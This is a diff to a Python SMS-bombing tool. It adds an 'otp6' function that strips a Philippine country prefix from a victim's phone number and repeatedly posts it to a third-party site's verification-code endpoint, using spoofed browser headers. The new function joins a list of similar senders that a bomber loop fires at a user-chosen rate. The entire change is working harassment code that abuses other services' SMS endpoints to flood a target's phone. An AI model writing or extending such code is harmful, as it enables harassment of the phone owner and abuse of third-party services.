@@ -194,6 +194,31 @@ def otp5(number):
     except:
         field+=1
         return False
+def otp6(number):
+    global limit, field
+    if str(number[0]) == "0":
+        number = str(number[1:])
+    elif str(number[0]) == "+":
+        number = str(number[3:])
+    elif str(number[:2]) == "63":
+        number = str(number[2:])
+    else:
+        pass
+    url = "https://www.qmsyrr.com/index/Index/smsCode.html"
+    header = {'Host': 'www.qmsyrr.com','Connection': 'keep-alive','Content-Length': '17','sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"','Accept': '*/*','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With': 'XMLHttpRequest','sec-ch-ua-mobile': '?0','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.46','sec-ch-ua-platform': '"Windows"','sec-gpc': '1','Origin': 'https://www.qmsyrr.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.qmsyrr.com/index/index/login.html?code=4927714','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9'}
+    body = {"mobile":str(number)}
+    try:
+        web = requests.post(url, headers = header, data = body)
+        if int(web.status_code) == 200:
+            limit+=1
+            return True
+        else:
+            field+=1
+            return False
+    except:
+        field+=1
+        return False
+
 
 def bomber(function):
     global limit, RUN, limit1, field, slp
@@ -220,7 +245,7 @@ def home():
     a.write(str(number))
     a.close()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mLimit")
-    function = [otp, otp1, otp2, otp3, otp4, otp5]
+    function = [otp, otp1, otp2, otp3, otp4, otp5, otp6]
     limit1 = pick()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mSleep")
     slp = pick()
